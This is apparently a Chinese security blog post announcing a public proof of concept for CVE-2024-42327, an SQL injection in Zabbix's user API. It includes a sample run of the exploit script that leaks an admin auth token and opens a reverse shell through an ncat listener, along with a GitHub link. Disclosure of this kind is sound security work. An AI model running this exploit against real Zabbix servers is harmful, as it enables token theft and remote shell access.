#  【未经核实】Zabbix RCE PoC 公布   
骨哥说事  骨哥说事   2025-02-17 01:03  
  
<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
  
#   
  
****# 防走失：https://gugesay.com/  
  
******不想错过任何消息？设置星标****↓ ↓ ↓**  
****  
#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
  
# CVE-2024-42327  
  
  
Zabbix 前端上的非管理员用户账户，无论是默认的 User 角色，还是具有 API 访问权限的任何其他角色，都可以利用这个漏洞。  
  
在 CUser 类的 addRelatedObjects 函数中存在一个 SQLi，该函数是从 CUser.get 函数中调用的，每个具有 API 访问权限的用户都可以使用该函数。  
  
# PoC 说明  
  
  
该 POC 可用于利用CVE-2024-42327泄露管理API身份验证令牌，并创建一个在Zabbix Server（Zabbix server < 6.0.32rc1, 6.4.17rc1, 7.0.1rc1）实现的反弹Shell。  
  
示例：  
  
```
python3 zabbix_privesc.py -t https://TARGET/zabbix/ -u USER -p PASSWORD[*] Authenticating ...[+] Login successful! USER API auth token: d0a05dfe4ce768f62e22bda4057c7c19[*] Starting data extraction ...[*] Extracting admin API auth token: af186c156b27a0c3f688b43f58c911c9[*] Getting host IDs ...[*] host.get response: {'jsonrpc': '2.0', 'result': [{'hostid': '10084', 'host': 'Zabbix server', 'interfaces': [{'interfaceid': '1'}]}], 'id': 1}[*] Starting listener and sending reverse shelll ...Ncat: Version 7.95 ( https://nmap.org/ncat )Ncat: Listening on [::]:4444Ncat: Listening on 0.0.0.0:4444Ncat: Connection from X.X.X.X:51004.zabbix@target:/$ ididuid=114(zabbix) gid=121(zabbix) groups=121(zabbix)
```  
  
  
https://github.com/godylockz/CVE-2024-42327  
  
**加入星球，随时交流：**  
  
**********（会员统一定价）：128元/年（0.35元/天）******  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hZj512NN8jnMJtHJnShkTnh3vR3fmaqicPicANic6OEsobrpRjx5vG6mMTib1icuPmuG74h2bxC4eP6nMMzbs5QaSlw/640?wx_fmt=jpeg&from=appmsg "")  
  
**感谢阅读，如果觉得还不错的话，欢迎分享给更多喜爱的朋友～******  
  
